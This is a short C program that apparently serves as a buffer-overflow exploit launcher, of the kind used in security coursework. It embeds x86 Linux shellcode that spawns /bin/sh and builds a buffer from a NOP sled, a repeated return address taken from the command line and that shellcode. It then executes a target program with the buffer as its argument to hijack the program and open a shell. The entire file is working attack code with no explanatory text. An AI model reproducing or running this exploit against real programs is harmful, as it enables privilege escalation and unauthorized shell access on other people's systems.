#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static char shellcode[] = ""
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

//first arg: target program, second arg: target address
int main(int argc, char* argv[]) {
	char* buffer;
	int i;
	long int targetAddr = strtoul(argv[2], NULL, 0);
	int bufferSize = 100;
	char *targetProgram = argv[1];

	buffer = malloc(bufferSize);

	targetAddr += 50;
	memcpy(buffer, "\x90\x90\x90\x90", 4);
	memcpy(buffer + 4, &targetAddr, 4);
	memcpy(buffer + 8, &targetAddr, 4);

	for (i = 12; i < 100; i++) {
		buffer[i] = 0x90;
	}

	memcpy(buffer + 50, shellcode, strlen(shellcode));

	buffer[bufferSize - 1] = '\0';

	execl(targetProgram, targetProgram, buffer, (char*)NULL);
	return 0;
}
